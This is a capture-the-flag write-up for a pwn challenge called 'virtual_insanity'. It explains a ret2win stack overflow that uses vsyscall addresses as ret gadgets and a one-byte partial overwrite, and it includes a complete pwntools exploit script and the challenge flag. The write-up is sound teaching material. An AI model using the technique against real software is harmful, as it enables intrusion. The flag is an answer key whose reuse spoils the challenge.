# virtual_insanity

## Description

Dancing, Walking, Rearranging Furniture

**DISCLAIMER**: This challenge doesn't require brute-forcing
## Overview of the challenge

The challenge is a standard ret2win with a pretty obvious overflow of 0x30 bytes, the binary is compiled without stack canary protection but has pie, with no apparent way to leak addresses.

## Solution

The intended solution involves performing a partial overwrite to redirect execution to the `win` function. However, the return address on the stack is a libc address. To work around this, we can leverage [vsyscall](https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-3.html) to traverse the stack until we locate the address of `main`. By modifying its least significant byte (LSB), we can transform it into the address of `win`. When execution returns, `vsyscall` effectively acts as a `ret` gadget, allowing us to redirect control flow to `win`.

Before overwrite:\
![](img1.png)

After overwrite:\
![](img2.png)

## Solve Script

```py
#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chall")

context.binary = exe

REMOTE_NC_CMD    = "nc localhost 7011"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    VSYSCALL = 0xffffffffff600000 #effectively a ret gadget
    r.send(b"A"*0x28 + p64(VSYSCALL)*2 + b"\xa9"); #lsb of win()

    r.interactive()

if __name__ == "__main__":
    main()
```

## Flag

`TRX{1_h0p3_y0u_d1dn7_bru73f0rc3_dc85efe0}`